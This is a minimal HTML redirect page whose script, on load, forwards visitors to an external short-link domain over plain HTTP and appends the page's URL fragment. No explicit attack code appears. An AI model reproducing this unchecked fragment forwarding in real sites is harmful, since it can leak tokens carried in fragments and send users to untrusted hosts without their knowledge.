<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Get the current fragment (everything after #)
            const fragment = window.location.hash;

            // Redirect immediately to the new domain with the fragment
            window.location.href = "http://omr.hahaletdoit.uk.eu.org/short/" + fragment;
        };
    </script>
</head>
</html>
